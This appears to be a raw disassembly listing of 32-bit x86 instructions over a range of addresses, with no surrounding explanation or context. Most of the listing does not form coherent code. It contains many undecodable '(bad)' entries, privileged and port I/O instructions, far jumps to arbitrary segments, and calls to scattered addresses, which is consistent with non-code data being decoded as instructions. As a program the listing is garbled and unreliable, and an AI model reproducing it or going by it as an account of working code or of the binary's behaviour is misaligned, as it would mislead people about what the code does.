  42117b:	mov    ch,0x74
  42117d:	hlt    
  42117e:	jne    0x4211e0
  421180:	mov    dl,0xfd
  421182:	jmp    0x5e00:0x0
  421189:	xor    edi,edx
  42118b:	inc    ecx
  42118d:	jmp    0x40:0x107815fb
  421194:	sub    ebx,DWORD PTR [eax+edi*8-0x1]
  421198:	inc    ecx
  421199:	sub    ecx,DWORD PTR [edi]
  42119b:	inc    eax
  42119c:	dec    esp
  42119d:	stos   DWORD PTR es:[edi],eax
  42119e:	xlat   BYTE PTR ds:[ebx]
  42119f:	pop    ebx
  4211a0:	cmp    edx,0xf3d08588
  4211a6:	sti    
  4211a7:	dec    DWORD PTR [esi+ebx*8-0xa24ca54]
  4211ae:	pop    ebx
  4211af:	mov    al,0xd
  4211b1:	push   ebp
  4211b2:	(bad)
  4211b5:	out    dx,al
  4211b6:	xchg   bl,ch
  4211b8:	imul   BYTE PTR [eax+ebp*4+0x1ec9407f]
  4211bf:	inc    eax
  4211c0:	jne    0x4211dc
  4211c2:	iret   
  4211c3:	push   ebp
  4211c4:	dec    edx
  4211c5:	mov    al,ds:0xbcf30c30
  4211ca:	add    BYTE PTR [eax],al
  4211cc:	jne    0x42121f
  4211ce:	in     al,0x76
  4211d0:	xor    eax,0x29123319
  4211d5:	daa    
  4211d6:	sar    bh,0xf1
  4211d9:	fadd   DWORD PTR [ebx]
  4211db:	test   ah,ch
  4211dd:	sbb    BYTE PTR [eax],al
  4211df:	add    al,dh
  4211e1:	repnz lods al,BYTE PTR ds:[esi]
  4211e3:	jge    0x421200
  4211e5:	cwde   
  4211e6:	bnd jmp DWORD PTR [esi]
  4211e9:	jno    0x4211b5
  4211eb:	cld    
  4211ec:	add    BYTE PTR [eax],al
  4211ee:	add    BYTE PTR [eax],al
  4211f0:	add    BYTE PTR [eax+0x75400ef9],cl
  4211f6:	sahf   
  4211f7:	cld    
  4211f8:	xor    BYTE PTR [edi+0x19],0x0
  4211fc:	add    BYTE PTR ds:0x758f4301,ah
  421202:	sbb    DWORD PTR [edi-0x52d40f09],eax
  421208:	(bad)  
  421209:	dec    BYTE PTR [eax]
  42120b:	mov    ch,cl
  42120d:	pop    ebp
  42120e:	mov    BYTE PTR [ecx+0x7ee962ff],0x72
  421215:	gs popf 
  421217:	cmp    edi,esp
  421219:	pop    ebp
  42121a:	hlt    
  42121b:	cmp    bh,0x4a
  42121e:	icebp  
  42121f:	jge    0x4211f8
  421221:	dec    ebp
  421222:	jne    0x4211b7
  421224:	(bad)  
  421225:	cmp    ah,BYTE PTR [eax-0x3a468cb4]
  42122b:	ret    
  42122c:	mov    ch,BYTE PTR [eax+0x49e7cbd3]
  421232:	add    edi,ebp
  421234:	add    esi,DWORD PTR [ebp+0x29]
  421237:	adc    esi,DWORD PTR [edi*8-0x487ec9bf]
  42123e:	es ss sbb al,0xf
  421242:	and    esi,0x3
  421245:	hlt    
  421246:	ds jmp 0xd247:0x55fa3288
  42124e:	punpckhbw mm0,QWORD PTR [esi*2+0xb8417e]
  421256:	add    BYTE PTR [eax],al
  421258:	add    BYTE PTR [eax],al
  42125a:	sub    DWORD PTR [ecx],0xffffffd3
  42125d:	das    
  42125e:	ficomp DWORD PTR [edx]
  421260:	push   edx
  421261:	xor    ecx,ecx
  421263:	sub    ebx,edx
  421265:	das    
  421266:	fidiv  DWORD PTR [esi+0x56]
  421269:	add    al,0x75
  42126b:	sbb    eax,0x21b29de5
  421270:	sbb    eax,0x8d29a930
  421275:	sar    DWORD PTR ds:0xedd9293b,1
  42127b:	push   ss
  42127c:	imul   esp,DWORD PTR [eax],0xdabcd56a
  421282:	inc    ebp
  421283:	dec    ebp
  421284:	jle    0x421301
  421286:	scas   al,BYTE PTR es:[edi]
  421287:	(bad)
  42128a:	mov    bh,BYTE PTR [ebx-0x25]
  42128d:	(bad)
  421292:	(bad)  
  421293:	pop    edx
  421294:	sbb    al,bh
  421296:	bound  ebp,QWORD PTR [eax]
  421298:	sti    
  421299:	jecxz  0x42121f
  42129b:	ret    0x7ee6
  42129e:	mov    bh,0xfa
  4212a0:	mov    DWORD PTR [ebx+0x3e],esp
  4212a3:	(bad)
  4212a6:	mov    bh,0xf6
  4212a8:	mov    DWORD PTR [ebx+0x7ee6c52e],ebp
  4212ae:	mov    bh,0x12
  4212b0:	add    BYTE PTR [edx-0x16bfc326],cl
  4212b6:	mov    ds:0xa64a13c4,eax
  4212bb:	cmp    eax,0xe940
  4212c0:	add    BYTE PTR [eax],al
  4212c2:	add    BYTE PTR [ebx+0x30317c4],dl
  4212c8:	bound  esi,QWORD PTR [ebx-0x63]
  4212cb:	cmp    ebp,DWORD PTR [ecx]
  4212cd:	mov    eax,DWORD PTR [ecx+ebx*2]
  4212d0:	rol    DWORD PTR [esi+0x403cf6b4],1
  4212d6:	jmp    0xe9580369
  4212db:	jbe    0x421358
  4212dd:	les    edi,FWORD PTR [ecx-0x6ecd8644]
  4212e3:	push   0x2c55ffc2
  4212e8:	fwait
  4212e9:	xor    BYTE PTR [edx-0x16bfc2fa],cl
  4212ef:	cmc    
  4212f0:	stos   DWORD PTR es:[edi],eax
  4212f1:	out    dx,eax
  4212f2:	mov    eax,ds:0xe9160c8e
  4212f7:	jbe    0x421374
  4212f9:	les    ebx,FWORD PTR [ecx+0x357ff467]
  4212ff:	mov    bl,0x28
  421301:	std    
  421302:	aaa    
  421303:	lock hlt 
  421305:	mov    al,ds:0xffc24a6d
  42130a:	pop    ebx
  42130b:	lds    ebx,FWORD PTR [eax]
  42130d:	push   edi
  42130e:	adc    DWORD PTR [eax+0x10],esi
  421311:	add    cl,ch
  421313:	repz ds dec edi
  421316:	mul    BYTE PTR [edx-0x58]
  421319:	retf   
  42131a:	stos   BYTE PTR es:[edi],al
  42131b:	jbe    0x421342
  42131d:	aad    0x53
  42131f:	bound  esp,QWORD PTR [ebx+0x6b]
  421322:	lods   eax,DWORD PTR ds:[esi]
  421323:	cmp    BYTE PTR [eax],ch
  421325:	mov    edx,DWORD PTR [eax+eax*1+0x0]
  421329:	add    BYTE PTR [eax],al
  42132b:	add    BYTE PTR [ecx-0x31],ch
  42132e:	out    0xc6,eax
  421330:	push   0x2
  421332:	add    BYTE PTR [eax],al
  421334:	(bad)  
  421335:	mov    ecx,0x8429ff4c
  42133a:	enter  0x1c43,0xf3
  42133e:	shl    BYTE PTR [ebx+0x3fc2a0],cl
  421344:	adc    eax,0x5fcc6ff9
  421349:	(bad)  
  42134a:	jae    0x421367
  42134c:	and    eax,0x4fcc83f9
  421351:	(bad)  
  421352:	jae    0x421367
  421354:	xor    eax,0x9fcc6bf9
  421359:	(bad)  
  42135a:	jae    0x421367
  42135c:	sbb    al,BYTE PTR [eax]
  42135e:	retf   0x8fcb
  421361:	(bad)  
  421362:	cld    
  421363:	cmp    cl,BYTE PTR [edi-0x2e77fd91]
  421369:	in     eax,0xc7
  42136b:	inc    ebx
  42136c:	fcom   QWORD PTR [edx+0x5a]
  42136f:	pop    ebx
  421370:	xchg   ebp,eax
  421371:	rcl    BYTE PTR [eax],0x0
  421374:	fldenv [esi+0x624083e8]
  42137a:	push   edx
  42137b:	push   edi
  42137c:	mov    dh,0x3f
  42137e:	dec    edi
  42137f:	call   0x3ea76c
  421384:	push   es
  421385:	and    ecx,DWORD PTR [ecx-0x1bc9d783]
  42138b:	mov    WORD PTR [ecx+0x6a0003],cs
  421391:	add    BYTE PTR [eax],al
  421393:	add    BYTE PTR [eax],al
  421395:	shr    BYTE PTR [eax+0xbd4c079],0x7e
  42139c:	adc    eax,0x7587035c
  4213a1:	dec    esp
  4213a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213a3:	jns    0x4213b1
  4213a5:	sar    DWORD PTR [edi],0xdc
  4213a8:	push   eax
  4213a9:	mov    BYTE PTR [eax],0x56
  4213ac:	push   edi
  4213ad:	and    al,0x89
  4213af:	dec    edx
  4213b0:	push   DWORD PTR [ebp+0x50]
  4213b3:	test   DWORD PTR [edi+0x14c9d72],edi
  4213b9:	jne    0x4213d4
  4213bb:	call   0xf8df:0xc5b4c507
  4213c2:	fnsave [edi-0x19]
  4213c5:	jne    0x42139d
  4213c7:	add    eax,DWORD PTR [eax]
  4213c9:	lock pop eax
  4213cb:	inc    DWORD PTR [edx+0x1b3b]
  4213d1:	clc    
  4213d2:	aad    0x1f
  4213d4:	dec    edi
  4213d5:	(bad)  
  4213d6:	sbb    dl,dh
  4213d8:	push   esp
  4213d9:	or     eax,0xf2fcc214
  4213de:	mov    cl,0xc5
  4213e0:	shl    eax,cl
  4213e2:	pop    eax
  4213e3:	inc    DWORD PTR [ebx+0x1b13]
  4213e9:	neg    BYTE PTR ds:0x9d83ff1c
  4213ef:	add    DWORD PTR fs:[ebp+0x19],esi
  4213f3:	jge    0x421437
  4213f5:	int    0x68
  4213f7:	call   0x0:0xff
  4213fe:	and    BYTE PTR [eax-0x17bcb9e8],cl
  421404:	das    
  421405:	xchg   BYTE PTR [eax],dh
  421407:	fld    QWORD PTR [ebp+0x7c9d72bf]
  42140d:	add    DWORD PTR [ebp+0x19],esi
  421410:	cmp    DWORD PTR [edx-0x63],0x18
  421414:	inc    DWORD PTR [ebx+0x1af7]
  42141a:	lock pop ebp
  42141c:	xor    BYTE PTR [edi-0x18],cl
  42141f:	push   ebp
  421420:	inc    eax
  421421:	dec    edi
  421422:	retf   
  421423:	mov    WORD PTR [eax],ds
  421425:	and    bh,BYTE PTR [ebx-0x4779d3d4]
  42142b:	adc    eax,DWORD PTR [esi+0x6b026abf]
  421431:	pushf  
  421432:	je     0x421436
  421434:	out    0x82,eax
  421436:	iret   
  421437:	xor    ah,dh
  421439:	(bad)  
  42143a:	test   ah,0xe8
  42143d:	add    esi,DWORD PTR [ebp+0x77]
  421440:	sub    ebp,DWORD PTR [eax]
  421442:	ret    0xe998
  421445:	aad    0xc1
  421447:	sbb    ch,cl
  421449:	mov    ebp,0xc95f2621
  42144e:	xor    al,BYTE PTR [eax-0x4309005a]
  421454:	call   0xbc3895c
  421459:	cmp    BYTE PTR [edx],al
  42145b:	pushf  
  42145c:	rol    BYTE PTR [eax+0x1c1e8e7f],0x0
  421463:	add    BYTE PTR [eax],al
  421465:	add    BYTE PTR [eax],al
  421467:	xor    ecx,DWORD PTR [edi]
  421469:	out    0x3,eax
  42146b:	(bad)  
  42146c:	mov    edi,0x3dedd46e
  421471:	push   ss
  421472:	(bad)  
  421473:	fldcw  WORD PTR [edi-0x4854e40e]
  421479:	pop    ebp
  42147a:	das    
  42147b:	test   DWORD PTR [edx-0x26],0x4ea7f5c2
  421482:	add    al,0x68
  421484:	jle    0x421465
  421486:	add    DWORD PTR [ebp+0x2],esi
  421489:	push   0xffffffb1
  42148b:	mov    ds:0x7186e5f8,al
  421490:	add    bh,ah
  421492:	add    eax,DWORD PTR [ebp+0x79]
  421495:	stos   DWORD PTR es:[edi],eax
  421496:	sub    edi,edi
  421498:	scas   eax,DWORD PTR es:[edi]
  421499:	inc    edx
  42149a:	sbb    al,0x7b
  42149c:	lods   al,BYTE PTR ds:[esi]
  42149d:	out    0x3,al
  42149f:	out    dx,al
  4214a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214a1:	adc    bh,BYTE PTR [ebx-0x60]
  4214a4:	sbb    ch,BYTE PTR [eax+0x4f027511]
  4214aa:	add    bh,BYTE PTR [eax+0x7f]
  4214ad:	push   edi
  4214af:	jns    0x4214b3
  4214b1:	add    BYTE PTR [edx+0x2c],ah
  4214b4:	and    DWORD PTR [esi],esi
  4214b6:	sub    al,0x8d
  4214b8:	test   BYTE PTR [ecx+0x271c4],0x0
  4214bf:	sub    al,0x31
  4214c1:	call   0xe3ea0ca9
  4214c6:	jmp    0xe91794fe
  4214cb:	add    BYTE PTR [eax],al
  4214cd:	add    BYTE PTR [eax],al
  4214cf:	add    BYTE PTR [esi+0x2],dh
  4214d2:	mov    DWORD PTR [ecx+eiz*1],ebp
  4214d5:	ds add bl,ch
  4214d8:	jbe    0x4214dc
  4214da:	add    BYTE PTR [edx+0x36],dh
  4214dd:	adc    DWORD PTR [edx-0x1a],ebp
  4214e0:	mov    bl,0xc0
  4214e2:	(bad)  
  4214e4:	jbe    0x4214e8
  4214e6:	add    BYTE PTR [edi],ch
  4214e8:	in     al,dx
  4214e9:	fs jge 0x4214a9
  4214ec:	(bad)  
  4214ed:	and    eax,0xc2aaf912
  4214f2:	dec    DWORD PTR [edi]
  4214f4:	pusha  
  4214f5:	rcr    bl,0x64
  4214f8:	ss mov cl,0x22
  4214fb:	ror    eax,cl
  4214fd:	ja     0x421579
  4214ff:	xchg   ecx,eax
  421500:	mov    esi,0x76fd2b1c
  421505:	add    cl,BYTE PTR [ecx+0x69b2a9c]
  42150b:	jb     0x421548
  42150d:	sbb    eax,0x2766fca
  421512:	sub    DWORD PTR [ecx],0xffffffdd
  421515:	cli    
  421516:	imul   esp,ecx,0xd9dfc033
  42151c:	jbe    0x421520
  42151e:	add    BYTE PTR [edi+0x62efc00f],bh
  421524:	mov    ch,0x18
  421526:	or     al,0x56
  421528:	inc    eax
  421529:	add    al,dh
  42152b:	add    cl,ch
  42152d:	cmp    eax,DWORD PTR [ecx+eax*1]
  421530:	sar    DWORD PTR [edi+0x570],1
  421536:	add    BYTE PTR [eax],al
  421538:	add    BYTE PTR [esp+eax*8-0x77],dh
  42153c:	add    BYTE PTR [edi+eiz*4+0x3f],cl
  421540:	or     cl,ah
  421542:	mov    esi,0x3bc70871
  421547:	lock jmp 0x4214fd
  42154d:	xlat   BYTE PTR ds:[ebx]
  42154e:	(bad)  
  42154f:	xchg   DWORD PTR [ebp+0x3c],eax
  421552:	pop    es
  421553:	ficom  WORD PTR [ebx]
  421555:	sbb    al,0x0
  421557:	xchg   DWORD PTR [ebp-0x24],eax
  42155a:	test   eax,0xd57c0847
  42155f:	jno    0x421539
  421561:	pop    ds
  421562:	out    0x4d,al
  421564:	mov    DWORD PTR [edi+0x2],ebp
  421567:	call   0x40af5c
  42156c:	add    BYTE PTR [edi+0x2],cl
  42156f:	xchg   DWORD PTR [ebp+0x10],ecx
  421572:	jg     0x4215a9
  421574:	das    
  421575:	addr16 inc ecx
  421577:	or     BYTE PTR [esi+edx*8-0x56],dh
  42157b:	dec    edi
  42157c:	or     BYTE PTR [edx],dl
  42157e:	sti    
  42157f:	comiss xmm3,DWORD PTR [ebx+0x41]
  421583:	or     BYTE PTR [ebx+0x514d0411],cl
  421589:	push   edi
  42158a:	imul   ecx,DWORD PTR [eax],0x4d281703
  421590:	call   0x3eb8f8
  421595:	popf   
  421596:	inc    edx
  421597:	or     BYTE PTR [ebx+0x4b8723cf],cl
  42159d:	add    BYTE PTR [eax],al
  42159f:	add    BYTE PTR [eax],al
  4215a1:	add    BYTE PTR [ecx+ecx*4+0x27a0c629],dl
  4215a8:	cld    
  4215a9:	mov    ecx,gs
  4215ab:	iret   
  4215ac:	push   esp
  4215ad:	call   0x50b627
  4215b2:	jne    0x42157a
  4215b4:	(bad)  
  4215b5:	test   ebp,0x6a4f42b0
  4215bb:	scas   al,BYTE PTR es:[edi]
  4215bc:	adc    ch,bh
  4215be:	call   0xa9e02de0
  4215c3:	adc    al,0x2b
  4215c5:	xor    BYTE PTR ds:0xc08914c5,0x21
  4215cc:	test   ebp,esi
  4215ce:	leave  
  4215cf:	sbb    edx,eax
  4215d1:	mov    BYTE PTR [ebx],dh
  4215d3:	inc    ecx
  4215d4:	mov    eax,0x79197572
  4215d9:	inc    eax
  4215da:	test   DWORD PTR [edx-0x2a11ec51],esi
  4215e0:	aas    
  4215e1:	mov    DWORD PTR [ebp+0x15],esi
  4215e4:	shl    BYTE PTR [edx-0x7f],1
  4215e7:	cwde   
  4215e8:	lods   eax,DWORD PTR ds:[esi]
  4215e9:	out    0x71,eax
  4215eb:	push   cs
  4215ec:	push   es
  4215ed:	(bad)  
  4215ee:	mov    dh,0x31
  4215f0:	add    ecx,ebp
  4215f2:	arpl   WORD PTR ds:0x8f80cc3,si
  4215f8:	sub    edi,esp
  4215fa:	jmp    0x851c:0x76e7ad97
  421601:	inc    ebp
  421602:	ficom  DWORD PTR [ebx+0xc52b]
  421608:	add    BYTE PTR [eax],al
  42160a:	add    BYTE PTR [esi],dh
  42160c:	add    DWORD PTR [edx+ebp*2],eax
  42160f:	sahf   
  421610:	xchg   esi,eax
  421611:	lods   eax,DWORD PTR ds:[esi]
  421612:	mov    ds:0x10d6c11d,eax
  421617:	jne    0x421632
  421619:	jge    0x42165d
  42161b:	lods   eax,DWORD PTR ds:[esi]
  42161c:	mov    BYTE PTR [edi-0x3c],dh
  42161f:	inc    ebp
  421620:	in     al,0xb5
  421622:	cpuid  
  421624:	gs cld 
  421626:	out    0x35,eax
  421628:	test   DWORD PTR [ebx],ebp
  42162a:	cld    
  42162b:	clc    
  42162c:	add    DWORD PTR [edi],esp
  42162e:	mov    bh,0x67
  421630:	ja     0x4215c5
  421632:	sub    esi,edi
  421634:	sub    ebx,DWORD PTR [edx+0x24772afd]
  42163a:	sbb    ebx,DWORD PTR [ecx-0x69]
  42163d:	out    0x3,al
  42163f:	(bad)
  421643:	in     eax,0xe2
  421645:	popa   
  421646:	(bad)  
  421647:	push   esi
  421648:	nop
  421649:	sahf   
  42164a:	sub    al,0xd3
  42164c:	sbb    esp,ebp
  42164e:	sub    edi,DWORD PTR [ecx+0x2]
  421651:	push   esi
  421652:	std    
  421653:	in     eax,dx
  421654:	iret   
  421655:	sahf   
  421656:	jge    0x421605
  421658:	out    0x5f,al
  42165a:	(bad)  
  42165b:	pop    edx
  42165c:	lods   al,BYTE PTR ds:[esi]
  42165d:	adc    al,0x79
  42165f:	scas   eax,DWORD PTR es:[edi]
  421660:	pushw  ds
  421662:	sbb    al,0x3f
  421664:	cmc    
  421665:	out    0x3,al
  421667:	out    dx,al
  421668:	(bad)  
  421669:	scas   al,BYTE PTR es:[edi]
  42166a:	aam    0xfd
  42166c:	dec    ecx
  42166d:	sub    eax,DWORD PTR ss:[eax]
  421670:	add    BYTE PTR [eax],al
  421672:	add    BYTE PTR [eax],al
  421674:	xchg   edx,esi
  421676:	popf   
  421677:	mov    cl,0x6e
  421679:	sub    bl,BYTE PTR [ecx+0x6121f9bf]
  42167f:	xor    al,0xf7
  421681:	sbb    dl,bh
  421683:	fcomi  st,st(5)
  421685:	lahf   
  421686:	jle    0x42168c
  421688:	imul   esp,esp,0x63
  42168b:	(bad)  
  42168c:	mov    dh,BYTE PTR [edx-0x4d6138a5]
  421692:	gs mov cl,0xc2
  421695:	lea    esp,[esp+ebx*1]
  421698:	outs   dx,DWORD PTR ds:[esi]
  421699:	rcl    DWORD PTR [ebp+0x2b],1
  42169c:	test   BYTE PTR [edx-0x2d],0xf7
  4216a0:	std    
  4216a1:	(bad)  
  4216a2:	rcl    BYTE PTR ds:[edx+0x7503b284],cl
  4216a9:	mov    edi,edi
  4216ab:	test   eax,0x29b0298a
  4216b0:	pop    edi
  4216b1:	push   ds
  4216b2:	xchg   BYTE PTR [edx-0xebd754a],ch
  4216b8:	add    edx,eax
  4216ba:	add    eax,DWORD PTR [eax]
  4216bc:	out    0x1f,al
  4216be:	cld    
  4216bf:	push   cs
  4216c0:	cli    
  4216c1:	dec    eax
  4216c2:	cld    
  4216c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4216c4:	cmp    al,0x48
  4216c6:	shr    ebp,0x76
  4216c9:	mov    ch,0x88
  4216cb:	add    eax,0x9a232cf2
  4216d0:	sar    DWORD PTR [ecx],cl
  4216d2:	mov    BYTE PTR [ecx+eiz*2],ch
  4216d5:	add    eax,ecx
  4216d7:	aaa    
  4216d8:	add    BYTE PTR [eax],al
  4216da:	add    BYTE PTR [eax],al
  4216dc:	add    BYTE PTR ds:0xbd09e80a,al
  4216e2:	and    esp,edi
  4216e4:	bound  esp,QWORD PTR [esi-0x7c]
  4216e7:	cmc    
  4216e8:	cmp    al,0x76
  4216ea:	sar    DWORD PTR [edi-0x3de3530],cl
  4216f0:	jmp    0x5c6bc23c
  4216f5:	fnstsw WORD PTR [edi+edx*2]
  4216f8:	xchg   ecx,eax
  4216f9:	and    bl,dh
  4216fb:	(bad)  
  4216fc:	call   0x3a3ddb7e
  421701:	jp     0x421749
  421703:	dec    edi
  421704:	cmp    bl,BYTE PTR [esi+0x8910794]
  42170a:	retf   0x7efc
  42170d:	popa   
  42170e:	(bad)  
  42170f:	imul   DWORD PTR [esi+esi*1-0x6b]
  421713:	bound  eax,QWORD PTR [ebx]
  421715:	ror    DWORD PTR [ebx+0x1da65542],cl
  42171b:	jb     0x421716
  42171d:	(bad)  
  42171e:	hlt    
  42171f:	outs   dx,DWORD PTR ds:[esi]
  421720:	push   DWORD PTR [esi-0x55da7ee0]
  421726:	mov    eax,DWORD PTR [edx+0x0]
  421729:	inc    eax
  42172a:	xor    eax,0xf75815fb
  42172f:	aas    
  421730:	add    BYTE PTR [edi],dl
  421732:	xor    dh,ah
  421734:	sub    ebp,ecx
  421736:	sbb    al,0x4e
  421738:	(bad)  
  421739:	jmp    0xa02a695a
  42173e:	cwde   
  42173f:	cld    
  421740:	inc    DWORD PTR [eax]
  421742:	add    BYTE PTR [eax],al
  421744:	add    BYTE PTR [eax],al
  421746:	mov    esp,0x2dec4999
  42174b:	fwait
  42174c:	or     BYTE PTR [edx],dh
  42174e:	or     eax,0x4c8c21fc
  421753:	add    al,0x89
  421755:	cmp    al,0x4e
  421757:	mov    eax,ds:0xce37fc41
  42175c:	daa    
  42175d:	fcomp  DWORD PTR [edi+0x61]
  421760:	hlt    
  421761:	push   ebx
  421762:	jl     0x4216fb
  421764:	add    BYTE PTR [esi],bh
  421766:	jl     0x421766
  421768:	or     DWORD PTR [esp+ebx*1+0x30458904],ecx
  42176f:	aaa    
  421770:	add    cx,WORD PTR [edi]
  421773:	out    dx,eax
  421774:	push   ebx
  421775:	push   esi
  421776:	xor    al,0x9
  421778:	inc    edi
  421779:	jmp    ebx
  42177b:	lahf   
  42177c:	mov    esp,0xe4320675
  421781:	mov    eax,0x33000687
  421786:	int3   
  421787:	std    
  421788:	adc    eax,0xfaf689ff
  42178d:	jne    0x42176f
  42178f:	xor    esp,esp
  421791:	in     al,0x67
  421793:	push   es
  421794:	add    BYTE PTR [ebx+0x3084f289],cl
  42179a:	push   edi
  42179b:	shl    DWORD PTR [edi],0x45
  42179e:	push   eax
  42179f:	add    eax,0x4a031041
  4217a4:	push   edi
  4217a5:	leave  
  4217a6:	jne    0x421793
  4217a8:	adc    eax,DWORD PTR [eax]
  4217aa:	add    BYTE PTR [eax],al
  4217ac:	add    BYTE PTR [eax],al
  4217ae:	add    BYTE PTR [eax-0x5c],cl
  4217b1:	pop    ss
  4217b2:	sbb    BYTE PTR [ecx-0x69d7cbb],0x29
  4217b9:	jne    0x4217fd
  4217bb:	icebp  
  4217bc:	jns    0x4217e5
  4217be:	jb     0x42183d
  4217c0:	lock or al,0xac
  4217c3:	mov    ecx,0x1c57006c
  4217c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217c9:	inc    ebx
  4217ca:	jb     0x42183f
  4217cc:	imul   ebp,ecx,0x2750142
  4217d2:	xor    DWORD PTR ds:0x750345d2,esi
  4217d8:	js     0x421801
  4217da:	jae    0x42176d
  4217dc:	and    DWORD PTR [edi],esp
  4217de:	adc    dl,BYTE PTR ds:0xffffc2fd
  4217e4:	and    cl,cl
  4217e6:	add    BYTE PTR [edx-0x4b],0xd4
  4217ea:	jg     0x421864
  4217ec:	arpl   WORD PTR [ebx],di
  4217ee:	inc    eax
  4217ef:	jne    0x42181a
  4217f1:	lods   al,BYTE PTR ds:[esi]
  4217f2:	and    ebx,DWORD PTR ds:0x22ff2cc4
  4217f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217f9:	inc    eax
  4217fa:	jae    0x42187a
  4217fc:	jmp    FWORD PTR [ecx-0x79]
  4217ff:	inc    ecx
  421800:	in     al,dx
  421801:	add    edx,DWORD PTR [esi+0xa]
  421804:	push   ds
  421805:	or     BYTE PTR [edx],dl
  421807:	mov    ch,0x29
  421809:	iret   
  42180a:	out    0x98,eax
  42180c:	jle    0x421835
  42180e:	cld    
  42180f:	dec    ebx
  421810:	nop
  421811:	or     eax,0x1c
  421816:	add    BYTE PTR [eax],al
  421818:	xchg   ecx,ebp
  42181a:	add    ebx,DWORD PTR [esi-0x12]
  42181d:	addr16 mov eax,0x737aff46
  421824:	cdq    
  421825:	cmp    eax,0x260fcce
  42182a:	fbstp  TBYTE PTR [edi]
  42182c:	xor    eax,0x234b7202
  421831:	test   DWORD PTR [ecx],esi
  421833:	scas   al,BYTE PTR es:[edi]
  421834:	imul   eax,DWORD PTR [ebp-0x259850ac],0xffffffeb
  42183b:	cmp    eax,0xafe6c2ad
  421840:	dec    edi
  421841:	sub    bh,cl
  421843:	cs xchg edx,eax
  421845:	push   ds
  421846:	bound  eax,QWORD PTR [ebx+0x6]
  421849:	out    0xbd,al
  42184b:	push   0x3a94dfa
  421850:	and    BYTE PTR [edi],bl
  421852:	sti    
  421853:	or     eax,DWORD PTR [edi+0x5f1be6c2]
  421859:	pop    ss
  42185a:	add    eax,0xfd1af528
  42185f:	scas   al,BYTE PTR es:[edi]
  421860:	ja     0x42188c
  421862:	imul   esi,DWORD PTR [ecx],0x28951e51
  421868:	addr16 (bad) 
  42186a:	clc    
  42186b:	ret    
  42186c:	inc    edx
  42186d:	mov    ebp,0xba357b3c
  421872:	test   eax,0x529afdcf
  421877:	(bad)  [edx+0xec3a9a]
  42187d:	add    BYTE PTR [eax],al
  42187f:	add    BYTE PTR [eax],al
  421881:	pop    ebp
  421882:	sahf   
  421883:	add    bh,al
  421885:	in     eax,dx
  421886:	retf   0xf736
  421889:	mov    edi,0x75f8029e
  42188e:	retf   0xcf1e
  421891:	mov    bl,0x1d
  421893:	adc    ah,al
  421895:	push   0x2a
  421897:	test   DWORD PTR [edx-0xe],edi
  42189a:	sbb    eax,0x8962abe7
  42189f:	lods   al,BYTE PTR cs:[esi]
  4218a1:	popf   
  4218a2:	retf   0xb0f2
  4218a5:	jo     0x421829
  4218a7:	push   eax
  4218a9:	sbb    eax,0xeedc701e
  4218ae:	test   ebx,ecx
  4218b0:	stos   BYTE PTR es:[edi],al
  4218b1:	jbe    0x4218d2
  4218b3:	adc    bh,ch
  4218b5:	fs ret 0x41ff
  4218b9:	mov    eax,ds:0x76cd779d
  4218be:	mov    ah,0x73
  4218c0:	ficomp DWORD PTR [edi]
  4218c2:	in     eax,dx
  4218c3:	out    0x66,eax
  4218c5:	gs push ds
  4218c7:	cld    
  4218c8:	push   0x61
  4218ca:	push   ds
  4218cb:	jae    0x42189d
  4218cd:	outs   dx,BYTE PTR ds:[esi]
  4218ce:	clc    
  4218cf:	cmc    
  4218d0:	es pop edx
  4218d2:	sub    dl,BYTE PTR [ecx]
  4218d4:	ins    BYTE PTR es:[edi],dx
  4218d5:	shr    DWORD PTR [ebp-0x53712004],0x89
  4218dc:	jmp    0x9f51c157
  4218e1:	jle    0x4218a2
  4218e3:	mov    cl,ch
  4218e5:	add    BYTE PTR [eax],al
  4218e7:	add    BYTE PTR [eax],al
  4218e9:	add    BYTE PTR [esi-0x56],dh
  4218ec:	xchg   DWORD PTR ds:0xd4fd1d36,esp
  4218f2:	jb     0x4218e4
  4218f4:	aas    
  4218f5:	jmp    0x3f06a332
  4218fa:	mov    bh,0x5
  4218fc:	add    BYTE PTR [edx+0x79],ah
  4218ff:	cmp    DWORD PTR [edi-0x773581ab],0x8a01151d
  421909:	aad    0x86
  42190b:	cmp    cl,0xe4
  42190e:	loop   0x42190f
  421910:	jg     0x4218c5
  421912:	or     al,0x90
  421914:	push   es
  421915:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421916:	add    DWORD PTR [edx+0x32f431cf],ecx
  42191c:	jb     0x4218ad
  42191e:	xor    al,0x1
  421920:	add    BYTE PTR [esi+ebp*2],dh
  421923:	sub    DWORD PTR [eax+0x7de8f000],eax
  421929:	in     al,dx
  42192a:	inc    eax
  42192b:	add    DWORD PTR [eax],eax
  42192d:	add    BYTE PTR [edi+0x4c],ch
  421930:	xchg   DWORD PTR [ebp-0x2c],esi
  421933:	xchg   edi,eax
  421934:	inc    edx
  421935:	or     BYTE PTR [ebx],al
  421937:	xor    DWORD PTR [ebp-0x4f58fbc],eax
  42193d:	adc    eax,0x3ff360
  421942:	adc    eax,0x271c205d
  421947:	pop    edi
  421948:	sbb    al,0x89
  42194a:	sar    BYTE PTR [esp],1
  42194d:	mov    eax,DWORD PTR [eax]
  42194f:	add    BYTE PTR [eax],al
  421951:	add    BYTE PTR [eax],al
  421953:	loop   0x421991
  421955:	sub    dx,WORD PTR ds:0x930205d
  42195c:	and    BYTE PTR gs:[eax-0x4c],dl
  421960:	clc    
  421961:	or     DWORD PTR [eax],edx
  421963:	pop    esp
  421964:	add    BYTE PTR [ecx+0x4c3c3044],cl
  42196a:	mov    edx,DWORD PTR [ebx-0x3e7a566]
  421970:	in     al,0x2f
  421972:	and    DWORD PTR [edx-0x2ac904f5],0x43
  421979:	and    BYTE PTR [eax],ah
  42197b:	lds    edx,FWORD PTR [edx+0x20]
  42197e:	and    al,0x24
  421980:	or     eax,0x824bff45
  421985:	js     0x4219ab
  421987:	je     0x42198f
  421989:	test   DWORD PTR [eax+esi*2+0x26],eax
  42198d:	xchg   DWORD PTR [ebp+0x24],eax
  421990:	fwait
  421991:	inc    esp
  421992:	or     al,0x97
  421994:	inc    esi
  421995:	or     al,0x89
  421997:	push   0x50892c22
  42199c:	and    dh,BYTE PTR [eax]
  42199e:	seto   BYTE PTR [edi]
  4219a1:	std    
